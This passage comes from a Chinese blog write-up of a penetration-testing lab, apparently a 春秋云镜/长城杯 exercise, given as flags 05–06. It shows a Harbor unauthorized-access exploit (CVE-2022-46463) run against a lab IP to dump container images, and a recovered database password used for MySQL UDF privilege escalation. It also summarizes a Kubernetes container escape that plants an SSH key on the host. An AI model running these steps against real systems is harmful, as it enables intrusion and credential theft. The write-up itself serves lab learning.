+<li><p><strong>K8s 的基本概念</strong>：不知道 deployment 是 “启动容器的配置”、hostPath 挂载是 “把宿主机目录映射到容器”；</p>
+</li>
+<li><p><strong>SSH 登录的原理</strong>：不知道<code>authorized_keys</code>是 “允许谁登录的白名单”，只要公钥在这个文件里，持有对应私钥的人就能免密码登录。</p>
+</li>
+</ol>
+<p>管理员配置失误（给容器开特权 + 挂载宿主机根目录）→ 攻击者利用配置创建恶意容器 → 容器里访问宿主机文件 → 给宿主机 root 写 SSH 公钥 → 后续 SSH 直接登录宿主机。</p>
+<hr>
+<h3 id="flag05"><a href="#flag05" class="headerlink" title="flag05"></a>flag05</h3><p><a target="_blank" rel="noopener" href="https://github.com/404tk/CVE-2022-46463">https://github.com/404tk/CVE-2022-46463</a></p>
+<p>存在 Harbor 公开镜像仓库未授权访问 CVE-2022-46463。Linux 环境下运行 <a target="_blank" rel="noopener" href="https://github.com/404tk/CVE-2022-46463">harbor.py</a>：</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/桌面/tools/ma]
+└─$ proxychains python3 harbor.py http://172.22.14.46
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+[*] API version used v2.0
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+[+] project/projectadmin
+[+] project/portal
+[+] library/nginx
+[+] library/redis
+[+] harbor/secret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>下载secret镜像</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/桌面/tools/ma]
+└─$ proxychains python3 harbor.py http://172.22.14.46 --dump harbor/secret --v2
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+[+] Dumping : harbor/secret:latest
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+    [+] Downloading : 58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
+/home/kali/桌面/tools/ma/harbor.py:128: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.
+  tf.extractall(f"{CACHE_PATH}{dir}/{name}")
+[Errno 1] Operation not permitted
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+    [+] Downloading : b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+    [+] Downloading : da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+    [+] Downloading : fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+    [+] Downloading : 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+    [+] Downloading : 8bd8c9755cbf83773a6a54eff25db438debc22d593699038341b939e73974653
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>镜像在caches里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/617d8df22447e20ba4f8452271ea2d13.png"></p>
+<hr>
+<h3 id="flag06"><a href="#flag06" class="headerlink" title="flag06"></a>flag06</h3><p>下载projectadmin镜像</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2 
+
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+[+] Dumping : project/projectadmin:latest
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+    [+] Downloading : 63e9bbe323274e77e58d77c6ab6802d247458f784222fbb07a2556d6ec74ee05
+/home/kali/桌面/tools/ma/harbor.py:128: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.
+  tf.extractall(f"{CACHE_PATH}{dir}/{name}")
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+    [+] Downloading : a1ae0db7d6c6f577c8208ce5b780ad362ef36e69d068616ce9188ac1cc2f80c6
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+    [+] Downloading : 70437571d98143a3479eaf3cc5af696ea79710e815d16e561852cf7d429736bd
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+    [+] Downloading : ae0fa683fb6d89fd06e238876769e2c7897d86d7546a4877a2a4d2929ed56f2c
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.14.46:80  ...  OK
+    [+] Downloading : 90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发现运行了 <code>run.sh</code></p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/…/ma/caches/project_projectadmin/latest]
+└─$ cat 90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c/run.sh 
+#!/bin/bash
+sleep 1
+
+# start
+java -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar
+/usr/bin/tail -f /dev/null           <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将<code>ProjectAdmin-0.0.1-SNAPSHOT.jar</code>导入<code>IDEA</code>（将<code>jar</code>放进项目下，右键添加为库）</p>
+<pre class="line-numbers language-none"><code class="language-none">spring.datasource.username=root
+spring.datasource.password=My3q1i4oZkJm3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>在 SpringBoot 配置文件 <code>application.properties</code> 中找到数据库账号密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1b040e1bbb8c9c34013d6a518560748b.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">java -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后MDUT直接连，再UDF提权下即可</p>
+<p>（不要用MDUT内置的sock，用proxychains/proxifier)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0f6efe4b61c332bba4d1abade299bcb4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/652c2caa4d37db4ef6fd4cdf55b39afe.png"></p>
+<hr>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lingqing777.github.io/2025/09/13/s-chang-cheng-bei/">https://lingqing777.github.io/2025/09/13/s-chang-cheng-bei/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">q1n9</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
+                                    <span class="chip bg-color">春秋云镜</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">渗透</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/09/21/wmctf/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="wmctf">
+                        
+                        <span class="card-title">wmctf</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-09-21
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/09/13/chang-cheng-bei/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="长城杯1">
+                        
+                        <span class="card-title">长城杯1</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-09-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2025</span>
+            
+            <a href="/about" target="_blank">q1n9</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">159.7k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
